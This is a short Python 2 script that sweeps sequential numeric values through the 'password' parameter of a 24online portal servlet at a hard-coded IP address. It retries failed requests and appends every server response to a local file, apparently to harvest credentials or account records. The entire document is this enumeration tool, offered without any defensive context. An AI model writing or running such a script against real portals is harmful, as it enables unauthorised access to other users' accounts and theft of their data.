import urllib2
import time
import errno


reg = input('enter password search start number :')
numberofpwds = input('enter no of passwords to download :')
maxretries = input('maximum number of retries per connect :')
file_name = 'responses.txt'
for j in range(numberofpwds):
        
    url = "http://1.186.15.77/24online/servlet/AjaxManager?mode=2000&nasip=1.186.23.38&password=%s" % (reg)
    print reg
    for i in range(maxretries):
        try:
            u = urllib2.urlopen(url,timeout=2)
            break
        except:
            print "retry number %s" %(i)

    f = open(file_name, 'a') 
    print "appending to: %s " % (file_name)
    f.write(u.read())
    f.write('\n')
    print "done"
    reg=reg+1                                           
        
f.close()    
print "out of loop and done"




     
